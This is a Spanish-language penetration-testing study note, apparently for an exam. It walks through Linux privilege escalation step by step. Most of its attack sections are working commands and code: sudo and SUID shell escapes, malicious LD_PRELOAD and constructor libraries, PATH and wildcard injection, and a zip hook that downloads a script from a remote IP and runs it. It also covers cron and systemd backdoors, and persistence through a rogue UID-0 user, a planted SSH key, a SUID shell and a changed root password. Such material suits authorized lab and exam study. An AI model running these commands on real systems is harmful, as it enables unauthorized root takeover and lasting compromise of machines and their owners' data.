# LPE Linux — enumeración y escalada paso a paso

Checklist de escalada en Linux. **Recorré en este orden**: de lo más probable a lo menos, y de
lo barato a lo caro.

Esta nota es el **paso a paso con comandos**. La referencia profunda está en
[`03-privesc-linux.md`](../03-privesc-linux.md).

> **Referencias por binario**: el espejo local de GTFOBins **no existe** en este vault (falta el
> directorio por binario). Queda el índice ([[GTFOBins]]) y las alternativas online de abajo.

> Fuentes: [HackTricks — Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) ·
> [HackTricks — Interesting Groups](https://book.hacktricks.wiki/en/linux-hardening/user-information/interesting-groups-linux-pe/index.html) ·
> [HackTricks — Wildcards](https://book.hacktricks.wiki/en/linux-hardening/interesting-files-permissions/wildcards-spare-tricks.html) ·
> [GTFOBins](https://gtfobins.github.io/) *(online: el espejo por binario no está generado)*.

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]]

---

## 0. Antes de empezar

### 0.1 Shell decente

Una shell inestable te hace perder más tiempo que cualquier escalada.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm; export SHELL=/bin/bash
stty rows 50 cols 200
```

Alternativas: `script -qc /bin/bash /dev/null`, `socat file:`tty`,raw,echo=0 tcp-listen:4444`.

> Si solo tenés una **webshell**, no alcanza para los flags: necesitás shell interactiva.
> Ver [[00-reglas-examen]].

### 0.2 Herramientas

```bash
# En tu Kali
cd ~/examen/tools/linux && python3 -m http.server 8000
```

| Herramienta | Para qué |
| --- | --- |
| `linpeas.sh` | Enumeración automática — **corrélo primero y leé lo rojo/amarillo** |
| `pspy64` / `pspy32` | Ver procesos y cron **sin permisos** (clave para cron) |
| `linux-exploit-suggester` (les.sh) | Exploits de kernel según versión |
| `linux-smart-enumeration` (lse.sh) | Alternativa a linpeas, por niveles |
| `traitor` | Auto-explotación de varios vectores |
| `DeepCe` | Enumeración/escape de contenedores |
| `LaZagne` | Credenciales en el sistema |

### 0.3 Regla de oro

**linpeas sugiere, vos decidís.** Marcá lo rojo/amarillo, pero verificá cada hallazgo. Y
recordá: **no hay escalada sin enumeración previa**.

---

## 1. Enumeración — bloque por bloque

### 1.1 Identidad y sistema

```bash
id; whoami; hostname
uname -a; cat /proc/version
cat /etc/os-release; lsb_release -a 2>/dev/null
sudo -V | head -1
date; df -h; lsblk; mount
lscpu; free -h
```

```bash
# Capacidades del proceso actual (útil: ¿corro con caps?)
cat /proc/self/status | grep Cap
capsh --print 2>/dev/null
```

### 1.2 Defensas y protecciones

```bash
# AppArmor / SELinux
aa-status 2>/dev/null; apparmor_status 2>/dev/null
sestatus 2>/dev/null
ls -d /etc/apparmor* /etc/selinux 2>/dev/null

# Otras
uname -r | grep -i grsec;  grep -i grsecurity /etc/sysctl.conf 2>/dev/null
which paxctl-ng paxctl 2>/dev/null
cat /proc/sys/kernel/randomize_va_space   # 0 = ASLR off
cat /proc/sys/kernel/yama/ptrace_scope    # 0 = ptrace permitido (sudo inject)
```

### 1.3 Usuarios, grupos y credenciales

```bash
cat /etc/passwd
cat /etc/shadow 2>/dev/null        # si estás en el grupo shadow
cat /etc/group
id                                  # ¡mirá los grupos!
```

```bash
# Credenciales olvidadas
cat ~/.bash_history ~/.zsh_history ~/.mysql_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
grep -riE "passw|secret|token|api[_-]?key" /home /var/www /opt /etc 2>/dev/null | head
find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null
cat ~/.netrc ~/.pgpass ~/.my.cnf 2>/dev/null
cat /var/lib/mysql/mysql/user.MYD 2>/dev/null
```

```bash
# Reusar credenciales conocidas con cada usuario (y sin contraseña)
su <user>
```

### 1.4 Procesos

```bash
ps aux
ps -ef
ps aux | grep -i root
```

**Qué buscar:**

- Procesos **root** cuyo binario/config es **escribible** por vos.
- Command lines con **credenciales** (`-p`, `--password`, connection strings).
- `wget`/`curl` a hosts internos (red oculta).
- Procesos repetitivos → **pspy**.

```bash
# Monitorizar todo lo que arranca (la mejor forma de ver cron/servicios)
./pspy64 -pf -i 1000

# Vecino por PID
cat /proc/<PID>/cmdline | tr '\0' ' '; echo
cat /proc/<PID>/environ 2>/dev/null | tr '\0' '\n'
ls -la /proc/<PID>/cwd
```

### 1.5 Red, puertos y sockets

```bash
ip a; ip route; arp -a
ss -ntlp; ss -unlp
netstat -tulpn 2>/dev/null
ss -xp                          # sockets UNIX
netstat -a -p --unix 2>/dev/null
cat /etc/hosts
```

Sockets interesantes: `docker.sock`, `containerd.sock`, y sockets HTTP:

```bash
curl --max-time 2 --unix-socket /path/to/socket http://localhost/
nc -U /tmp/socket            # conectar a un Unix socket
```

### 1.6 Archivos, permisos y SUID

```bash
# SUID / SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# ACLs
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null

# Writable
find / -writable -type d 2>/dev/null | grep -vE "^/(proc|sys|dev|run)"
find / -writable -type f 2>/dev/null | grep -vE "^/(proc|sys|dev|run)"
find / -group root -perm -g=w 2>/dev/null

# Archivos críticos
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/ /etc/ld.so.preload 2>/dev/null
```

### 1.7 Tareas programadas (cron)

```bash
crontab -l
ls -la /etc/cron* /etc/at* 2>/dev/null
cat /etc/crontab /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null
cat /var/spool/cron/* 2>/dev/null
```

**Trucos:**

```bash
# Ver TODAS las entradas, incluidas las "invisibles" (CR sin newline)
cat -A /etc/crontab /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head

# run-parts: qué nombres se ejecutarán de verdad (evita falsos positivos)
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily

# Timers de systemd (alternativa a cron)
systemctl list-timers --all
```

> **pspy es obligatorio**: el cron es invisible sin él y es una de las mejores vías.

### 1.8 Servicios, timers y systemd

```bash
systemctl list-units --type=service --state=running
systemctl list-timers --all
systemctl show-environment                 # ¡mirá el PATH de systemd!

# Unidades y drop-ins escribibles
find /etc/systemd/system -writable -type f 2>/dev/null
find /etc/systemd/system -name "*.d" -type d 2>/dev/null
find /lib/systemd /usr/lib/systemd -writable 2>/dev/null

# Detalle de una unidad (incluye drop-ins)
systemctl cat <unit>

# Sockets .socket
systemctl list-units --type=socket
```

### 1.9 D-Bus

```bash
busctl list 2>/dev/null
dbus-send --system --print-reply --dest=org.freedesktop.DBus \
          /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null
```

> Si podés hablar con un servicio D-Bus privilegiado, puede haber inyección de comandos.
> Ver [HackTricks D-Bus](https://book.hacktricks.wiki/en/linux-hardening/processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.html).

### 1.10 Software y kernel

```bash
dpkg -l 2>/dev/null | head -50
rpm -qa 2>/dev/null | head -50
uname -r; cat /proc/version
searchsploit linux kernel $(uname -r | cut -d- -f1)
```

```bash
# needrestart vulnerable (LPE 2024): ¿instalado/activo?
dpkg-query -W needrestart 2>/dev/null
grep -R interpscan /etc/needrestart 2>/dev/null
```

---

## 2. Orden de ataque — checklist rápido

```text
[ ] 0.  Estabilizar shell (python pty + stty)
[ ] 1.  id + sudo -l                              ← gratis, altísimo rendimiento
[ ] 1b. linpeas + pspy                            ← automático, para orientar
[ ] 2.  SUID/SGID  → GTFOBins
[ ] 3.  getcap -r /  → capabilities
[ ] 4.  Credenciales en archivos / historiales
[ ] 5.  Procesos root con código/config escribible
[ ] 6.  Cron (pspy): PATH, wildcard, script escribible, invisible
[ ] 7.  Servicios/systemd: unit/binario/drop-in escribible, PATH relativo
[ ] 8.  Grupos (disk, video, docker, lxd, adm, staff, shadow…)
[ ] 9.  NFS no_root_squash
[ ] 10. /etc/passwd o /etc/shadow escribibles
[ ] 11. Wildcard/argv injection (tar, rsync, 7z, zip…)
[ ] 12. Kernel / CVEs                            ← ÚLTIMO
```

---

## 3. Explotación por vector

### 3.1 sudo

```bash
sudo -l
```

**Binarios permitidos → GTFOBins.** Ejemplos:

```bash
sudo vim -c ':!/bin/sh'
sudo less /etc/hosts      # y dentro:  !/bin/sh
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo env /bin/sh
```

**Trucos según lo que muestre `sudo -l`:**

| Config | Ataque |
| --- | --- |
| `env_keep+=LD_PRELOAD` | compilar `pe.so` y `sudo LD_PRELOAD=./pe.so <cmd>` |
| `env_keep+=LD_LIBRARY_PATH` | `sudo LD_LIBRARY_PATH=/tmp <cmd>` con `libcrypt.so.1` malicioso |
| `env_keep+=BASH_ENV` | `BASH_ENV=/tmp/s.sh sudo <script>` → shell root |
| `env_keep+=PATH` / `secure_path` con dir escribible | crear el comando y que el script lo llame sin ruta absoluta |
| `SETENV:` | `sudo PYTHONPATH=/dev/shm/ <script>` → import hijack |
| comando **sin ruta** (`ALL=(root) less`) | `export PATH=/tmp:$PATH`; backdoor `less` en `/tmp` |
| `sudoedit` y sudo < 1.9.12p2 | CVE-2023-22809: `SUDO_EDITOR="vim -- /etc/sudoers" sudoedit /etc/hosts` |
| sudo 1.9.14–1.9.17 | CVE-2025-32463 (`--chroot`), CVE-2025-32462 (spoof `sudo -h`) |
| sudo < 1.8.28 | `sudo -u#-1 /bin/bash` |

**LD_PRELOAD con `env_keep`:**

```c
// /tmp/pe.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
sudo LD_PRELOAD=./pe.so <COMANDO_PERMITIDO>
```

**BASH_ENV con `env_keep`:**

```bash
cat > /tmp/s.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/s.sh
BASH_ENV=/tmp/s.sh sudo /usr/bin/<script_permitido>
```

**`__pycache__` writable + script Python con sudo** (poisoning de `.pyc`):

```bash
find / -type d -name __pycache__ -writable 2>/dev/null
# 1) corre el script una vez para crear el .pyc legítimo
# 2) guarda sus primeros 16 bytes (header), compila tu payload, marshal.dumps,
#    borra el .pyc y escribe header + bytecode malicioso
# 3) vuelve a correr el script con sudo → tu código como root
```

**Terraform** (si `sudo` no resetea el entorno y hay `terraform apply`):

```hcl
# ~/.terraformrc
provider_installation { dev_overrides { "prev.htb/terraform/examples" = "/dev/shm" } direct {} }
```

**Sudo tokens reutilizables** (usó sudo hace <15 min, `ptrace_scope=0`, `gdb`):

```bash
git clone https://github.com/nongiach/sudo_inject
bash exploit.sh && /tmp/activate_sudo_token && sudo su
```

**sudoers**:

```bash
ls -l /etc/sudoers.d/*; getfacl /etc/sudoers.d/<file>   # ACL oculta = backdoor
echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/hacker
```

### 3.2 SUID / SGID

```bash
find / -perm -4000 -type f 2>/dev/null
# Para cada binario: ¿está en GTFOBins?
```

**Writable script ejecutado por un wrapper SUID**: si un SUID hace `system("/bin/bash /ruta/script.sh")` y el script es escribible:

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /ruta/script.sh
/ruta/wrapper_suid
/tmp/rootbash -p
```

**SUID sin ruta absoluta** → PATH hijack:

```bash
cd /tmp && echo -e '#!/bin/bash\n/bin/bash -p' > <comando> && chmod +x <comando>
PATH=/tmp:$PATH /ruta/binario_suid
```

**SUID con ruta absoluta** a otro binario → exportar función con ese nombre:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp/b && chmod +s /tmp/b && /tmp/b -p; }
export -f /usr/sbin/service
/ruta/binario_suid
```

**`.so` injection (binario SUID que carga una librería que falta):**

```bash
strace /ruta/SUID 2>&1 | grep -iE "open|access|no such file"
```

```c
// libcalc.c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject(){ system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"); }
```

```bash
gcc -shared -o /ruta/escribible/libcalc.so -fPIC libcalc.c
```

**RPATH / RUNPATH escribible:**

```bash
readelf -d /ruta/SUID | grep -E "RPATH|RUNPATH"
ldd /ruta/SUID
# Si apunta a un dir escribible, poné ahí la .so con el nombre esperado
```

**`/etc/ld.so.preload`** escribible (afecta a procesos que lo cargan):

```bash
echo "/tmp/pe.so" > /etc/ld.so.preload
```

> **GTFOBins por contexto**: el mismo binario lleva **código distinto** según `sudo`, `suid`,
> `capabilities` o `file-read`. `find` por sudo es `find . -exec /bin/sh \; -quit`; por **SUID**
> necesita `-p`: `find . -exec /bin/sh -p \; -quit`. Sin `-p` no conservás privilegios.

### 3.3 Capabilities

```bash
getcap -r / 2>/dev/null
```

| Capability | Cómo se explota |
| --- | --- |
| `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` · `perl -e 'POSIX::setuid(0); exec "/bin/bash"'` |
| `cap_setgid+ep` | igual con `setgid(0)` |
| `cap_dac_read_search+ep` | leer cualquier archivo: `tar czf /tmp/shadow.tar.gz /etc/shadow` y extraer |
| `cap_dac_override+ep` | escribir archivos arbitrarios (p. ej. `/etc/passwd`) |
| `cap_fowner+ep` | `chown root:root archivo` y aprovecharte |
| `cap_chown+ep` | cambiar dueño de archivos |
| `cap_sys_admin+ep` | montar sistemas de archivos / namespaces |
| `cap_sys_ptrace+ep` | inyectar en un proceso root (gdb) |
| `cap_sys_module+ep` | cargar un módulo del kernel |
| `cap_sys_rawio+ep` | acceso crudo al disco |
| `cap_sys_chroot+ep` | escapar de un chroot |
| `cap_setfcap+ep` | asignar capabilities a otros binarios |
| `cap_mknod+ep` | crear nodos de dispositivo |
| `cap_net_admin`, `cap_net_raw` | sniffing / red |

Ejemplos:

```bash
# cap_dac_read_search sobre tar (leer /etc/shadow)
tar czf /tmp/shadow.tar.gz /etc/shadow && tar xzf /tmp/shadow.tar.gz -C /tmp

# cap_setuid sobre python
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 3.4 Cron

**PATH del crontab** (si un script llama algo sin ruta absoluta):

```bash
# /etc/crontab: PATH=/home/user:/usr/local/sbin:...  y  * * * * * root overwrite.sh
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
# esperar  →  /tmp/bash -p
```

**Wildcard injection** (root ejecuta `tar/rsync/zip/7z * `):

```bash
# tar
echo 'echo pwned > /tmp/pwn' > shell.sh; chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
# y root corre:  tar -czf /backup.tgz *

# rsync
touch -- "-e sh shell.sh"
# 7z (exfiltración incluso con -- *)
ln -s /etc/shadow root.txt; touch @root.txt
# zip (RCE via test hook, tokens separados)
touch -- "-T" "-TT wget 10.0.0.1 -O s.sh; bash s.sh"
```

Otros ganchos: `flock -c <cmd>`, `git -c core.sshCommand=<cmd>`, `scp -S <program>`,
`tcpdump ... -z <cmd>`. Herramienta: [wildpwn](https://github.com/localh0t/wildpwn).

**Script escribible o symlink de carpeta:**

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /ruta/script_cron
ln -d -s /ruta/peligrosa /ruta/donde_escribe_cron
```

**Tareas frecuentes** (sin pspy):

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/mp.tmp; sleep 0.1; done
sort /tmp/mp.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort; rm /tmp/mp.tmp
```

**Inyección por expansión aritmética** (parser root hace `(( total += count ))` con un campo de log que controlás):

```text
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
```

**run-parts / update-motd** (grupo `staff` y `/usr/local/bin` en el PATH):

```bash
# run-parts ejecuta scripts de /etc/update-motd.d en cada login SSH como root
cat > /usr/local/bin/run-parts <<'EOF'
#!/bin/bash
chmod 4777 /bin/bash
EOF
chmod +x /usr/local/bin/run-parts
# nuevo login  →  /bin/bash -p
```

### 3.5 Servicios y systemd

**Unidad `.service` escribible** → `ExecStart`:

```bash
find /etc/systemd/system -writable -type f 2>/dev/null
# editar ExecStart=/tmp/backdoor  y esperar restart/reboot
```

**Binario de servicio escribible** → reemplazarlo.

**systemd PATH con ruta relativa** (`ExecStart=faraday-server`) y dir escribible:

```bash
systemctl show-environment   # ver PATH
# crear el binario con ese nombre en el dir escribible del PATH
```

**Drop-in escribible** (`/etc/systemd/system/<unit>.d/*.conf`):

```bash
# override de ExecStart/User
```

**Timers** (`Unit=backdoor.service`), **sockets** (`ExecStartPre=/tmp/backdoor`),
**socket activation** (crear el `.service` que falta y provocar tráfico), **generators**
(`/etc/systemd/system-generators` escribible).

### 3.6 Grupos

```bash
id
```

| Grupo | Cómo da root |
| --- | --- |
| `sudo` / `admin` / `wheel` | `sudo su` |
| `shadow` | leer `/etc/shadow` → `john`/`hashcat` |
| `staff` | write en `/usr/local` + run-parts/update-motd |
| `disk` | acceso crudo al disco (`debugfs`) |
| `video` | leer el framebuffer (pantalla, a veces credenciales) |
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` / `lxc` | contenedor privilegiado con `/` montado |
| `adm` | leer logs (`/var/log`) |
| `root` | archivos group-writable de root |
| `backup`/`operator`/`lp`/`mail` | credenciales en backups/spools |
| `auth` | (OpenBSD) S/Key, YubiKey |

```bash
# disk
df -h                       # ubicar /
debugfs /dev/sda1           # y dentro:  cat /root/.ssh/id_rsa  ·  cat /etc/shadow

# video
cat /dev/fb0 > /tmp/screen.raw

# docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# staff: ver §3.4 (run-parts)
```

Receta: [[docker-group]], [[lxd]].

### 3.7 NFS con `no_root_squash`

```bash
showmount -e <IP>
sudo mount -t nfs <IP>:/share /mnt -o nolock
```

```c
// en el share montado, como root en TU Kali
// shell.c
#include <unistd.h>
int main(void){ setuid(0); setgid(0); system("/bin/bash -p"); }
```

```bash
gcc /mnt/shell.c -o /mnt/shell
sudo chown root:root /mnt/shell && sudo chmod 4755 /mnt/shell
# Y EN LA VÍCTIMA:  /ruta/al/share/shell
```

Receta: [[nfs-no_root_squash]].

### 3.8 Archivos escribibles peligrosos

| Archivo | Ataque |
| --- | --- |
| `/etc/passwd` | agregar usuario root (ver §4) |
| `/etc/shadow` | reemplazar el hash de root |
| `/etc/sudoers` o `/etc/sudoers.d/*` | añadir `user ALL=(ALL) NOPASSWD:ALL` (mirá ACL con `getfacl`) |
| `/etc/ld.so.preload` | cargar `.so` en procesos privilegiados |
| `.git/hooks/pre-commit` | ejecución cuando root hace commit/push |
| `/proc/sys/fs/binfmt_misc` | registrar un intérprete para un tipo de archivo |
| `~/.config/mimeapps.list` | redirigir `http:`/`https:` a un `.desktop` malicioso |
| `php.ini` de un sandbox root | quitar `disable_functions` |
| Archivos de root que **vos** podés escribir | pspy para cazarlos → reemplazar |

### 3.9 SSH agent forwarding, screen/tmux y entorno

```bash
# SSH agent forwarding
echo $SSH_AUTH_SOCK
ssh-add -l          # claves del agente del usuario reenviado
# usar el socket del agente de root si es accesible
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.PID ssh root@localhost
```

```bash
# Sesiones abiertas
screen -ls; screen -dr <session>
tmux ls; tmux -S /tmp/dev_sess attach -t 0
```

```bash
# Variables de entorno peligrosas
env | grep -E "LD_|PYTHONPATH|PERL5LIB|RUBYLIB|PATH"
```

### 3.10 D-Bus y sockets

Inyección de comandos vía servicios D-Bus privilegiados, o abuso de sockets con permisos
débiles (`docker.sock`, servicios internos). Ver §1.5 y
[HackTricks D-Bus](https://book.hacktricks.wiki/en/linux-hardening/processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.html).

### 3.11 Kernel y CVEs (último recurso)

```bash
uname -a; cat /etc/os-release
searchsploit linux kernel $(uname -r | cut -d- -f1)
# Antes de correr: verificá PRERREQUISITOS reales, no solo uname -r
unshare -Urn true   # ¿namespaces de usuario disponibles?
```

| CVE | Nombre | Rango |
| --- | --- | --- |
| CVE-2022-0847 | Dirty Pipe | Linux 5.8 → 5.16.11 |
| CVE-2021-4034 | PwnKit (`pkexec`) | casi toda distro de la última década |
| CVE-2016-5195 | DirtyCow | Linux ≤ 3.19 |
| CVE-2024-1086 | netfilter nf_tables UAF | kernels 5.14–6.6 |
| CVE-2024-48990+ | needrestart | utilidades de análisis de intérpretes |
| CVE-2026-31431 | Copy Fail (`AF_ALG`) | page-cache-only write |

```bash
pkexec --version      # si es vulnerable, PwnKit da root en segundos
```

> **Antes de correr un exploit de kernel, preguntate si podés permitir que la máquina se caiga.**
> Si la respuesta es no, agotá las vías de configuración.

---

## 4. Post-explotación: asegurar root

> Objetivo: **mantener el acceso** creando tu propio root, una clave SSH o una shell SUID.
> Verificá siempre con `id`.

### 4.1 Añadir un usuario root / a sudo

```bash
# Opción A: usuario root directo en /etc/passwd
openssl passwd -1 -salt xyz 'pwned'          # o:  openssl passwd -6 'pwned'
echo 'pwned:$1$xyz$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned

# Opción B: meter tu usuario en sudo/admin
usermod -aG sudo <user>     # Debian/Ubuntu
usermod -aG wheel <user>    # RHEL/CentOS
echo '<user> ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<user>
```

### 4.2 Clave SSH en el root

```bash
mkdir -p /root/.ssh
echo 'ssh-rsa AAAA... tu_clave_publica' >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
```

### 4.3 Shell SUID

```bash
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
/tmp/rootbash -p          # -p conserva el euid de root
```

### 4.4 Cambiar la contraseña de root

```bash
echo 'root:Nuev4Pass!' | chpasswd
```

### 4.5 Verificación

```bash
id
sudo -l
```

---

## 5. Errores que cuestan tiempo

| Error | Por qué duele |
| --- | --- |
| Ir directo al kernel exploit | Puede tumbar la máquina y quemar un revert |
| No correr `sudo -l` primero | Es gratis y es la vía más probable |
| Ignorar `getcap -r /` | Las capabilities son escaladas limpias y frecuentes |
| Ignorar pspy | El cron es invisible sin pspy, y es de las mejores vías |
| Usar GTFOBins sin contexto | El mismo binario necesita código distinto por `sudo`/`suid`/`caps` |
| Correr linpeas y esperar que resuelva | linpeas sugiere; el juicio es tuyo |
| No documentar mientras escalás | El reporte es final e inapelable — ver [[08-reporte-y-evidencia]] |

---

## 6. Herramientas y referencias

| Recurso | Para qué |
| --- | --- |
| [[GTFOBins]] | Índice de 458 binarios y sus funciones. Las **notas por binario no están generadas**: el código por contexto (`sudo`/`suid`/`caps`) está en las alternativas online de abajo |
| [HackTricks — Linux LPE](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) | Listado exhaustivo de vectores |
| [HackTricks — Interesting Groups](https://book.hacktricks.wiki/en/linux-hardening/user-information/interesting-groups-linux-pe/index.html) | disk, video, docker, lxd, adm… |
| [HackTricks — Wildcards](https://book.hacktricks.wiki/en/linux-hardening/interesting-files-permissions/wildcards-spare-tricks.html) | tar, rsync, 7z, zip, tcpdump |
| [GTFOArgs](https://gtfoargs.github.io/) | Abuso solo con inyección de argumentos |
| [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) | Exploits de kernel según versión |
| [`03-privesc-linux.md`](../03-privesc-linux.md) | Referencia profunda por técnica del playbook |
